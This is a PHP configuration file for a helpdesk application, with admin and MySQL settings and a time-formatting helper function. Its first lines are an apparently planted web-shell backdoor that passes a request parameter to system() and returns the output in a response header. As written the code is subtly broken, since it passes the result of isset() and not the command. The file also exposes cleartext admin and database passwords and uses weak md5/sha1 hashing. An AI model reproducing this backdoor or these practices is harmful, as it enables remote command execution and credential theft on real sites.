<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
  // Fill in the following variables with accurate information.
  $admin_username = "help"; // The username you will use to login to the admin panel.
  $admin_password = "O.u*5j"; // The password to go along with the admin's username.
  $admin_email = "everpay@gmail.com"; // The email address that alerts will be sent to.
  
  $helpdesk_company_name = "Zoanga"; // The name of the company/ organization the helpdesk will be used for.
  $path_to_helpdesk = "https://zoanga.com/support/"; // Path to the /helpdesk/ application on your site, include http:// and a trailing slash.
  
  $database_host = "localhost"; // The MySQL database host, usually 'localhost'
  $database_username = "everpayi_easylog"; // The MySQL username.
  $database_password = "AsdfgH!@#"; // The MySQL password.
  $database_name = "everpayi_easylogin"; // The name of the MySQL database to use.
  
  $send_notifications = 1; // 0 = no. 1 = yes. - Determines if the admin will be sent an email when a new help ticket is created.
  
  
  
  //////////////////////////////////
  /* DO NOT EDIT BELOW THIS POINT */
  //////////////////////////////////
  
  $admin_password = md5(sha1($admin_password));
  mysql_connect($database_host,$database_username,$database_password);
  mysql_select_db($database_name);
  session_start();
  ob_start();
  
  
  /* Required Functions */
  
  function time_since($original) {
    // array of time period chunks
    $chunks = array(
        array(60 * 60 * 24 * 365 , 'year'),
        array(60 * 60 * 24 * 30 , 'month'),
        array(60 * 60 * 24 * 7, 'week'),
        array(60 * 60 * 24 , 'day'),
        array(60 * 60 , 'hour'),
        array(60 , 'minute'),
    );
    
    $today = time(); /* Current unix time  */
    $since = $today - $original;
	
	if($since > 604800) {
		$print = date("M jS", $original);
	
		if($since > 31536000) {
				$print .= ", " . date("Y", $original);
			}

		return $print;

	}
    
    // $j saves performing the count function each time around the loop
    for ($i = 0, $j = count($chunks); $i < $j; $i++) {
        
        $seconds = $chunks[$i][0];
        $name = $chunks[$i][1];
        
        // finding the biggest chunk (if the chunk fits, break)
        if (($count = floor($since / $seconds)) != 0) {
            // DEBUG print "<!-- It's $name -->\n";
            break;
        }
    }

    $print = ($count == 1) ? '1 '.$name : "$count {$name}s";

    return $print . " ago";

  }
?>
